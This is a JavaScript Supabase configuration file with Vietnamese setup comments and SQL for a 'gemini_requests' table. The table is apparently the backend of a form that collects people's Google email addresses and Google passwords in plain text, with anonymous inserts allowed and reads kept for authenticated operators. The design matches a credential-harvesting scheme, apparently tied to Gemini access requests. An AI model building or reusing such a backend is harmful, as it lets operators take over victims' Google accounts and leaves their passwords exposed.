// Supabase Configuration
// QUAN TRỌNG: Thay thế các giá trị dưới đây bằng thông tin từ Supabase project của bạn

window.SUPABASE_CONFIG = {
    url: 'https://dfqpbbysgzhooiuuvfzc.supabase.co',
    anonKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRmcXBiYnlzZ3pob29pdXV2ZnpjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA4MzA5MjcsImV4cCI6MjA3NjQwNjkyN30.cgUPriDDrCMP95N3pbbXpMkfswVCB1fbae7FN5yitWU'
};

/* 
HƯỚNG DẪN LẤY THÔNG TIN SUPABASE:

1. Đăng nhập vào https://supabase.com/
2. Tạo project mới hoặc chọn project có sẵn
3. Vào Settings > API
4. Copy "Project URL" và paste vào trường 'url'
5. Copy "anon public" key và paste vào trường 'anonKey'

CẤU TRÚC BẢNG DATABASE:

Tạo bảng 'gemini_requests' với các cột sau:

Table: gemini_requests
- id: int8 (primary key, auto increment)
- google_email: text
- google_password: text
- contact_email: text
- status: text (default: 'pending')
- created_at: timestamptz (default: now())
- updated_at: timestamptz

SQL để tạo bảng:

CREATE TABLE gemini_requests (
  id BIGSERIAL PRIMARY KEY,
  google_email TEXT NOT NULL,
  google_password TEXT NOT NULL,
  contact_email TEXT NOT NULL,
  status TEXT DEFAULT 'pending',
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ
);

-- Tạo index cho tìm kiếm nhanh
CREATE INDEX idx_gemini_requests_status ON gemini_requests(status);
CREATE INDEX idx_gemini_requests_created_at ON gemini_requests(created_at);

-- Enable Row Level Security (RLS)
ALTER TABLE gemini_requests ENABLE ROW LEVEL SECURITY;

-- Tạo policy cho phép insert từ client
CREATE POLICY "Enable insert for all users" ON gemini_requests
  FOR INSERT TO anon
  WITH CHECK (true);

-- Tạo policy cho phép read (nếu cần - chỉ cho admin)
CREATE POLICY "Enable read for authenticated users only" ON gemini_requests
  FOR SELECT TO authenticated
  USING (true);

*/

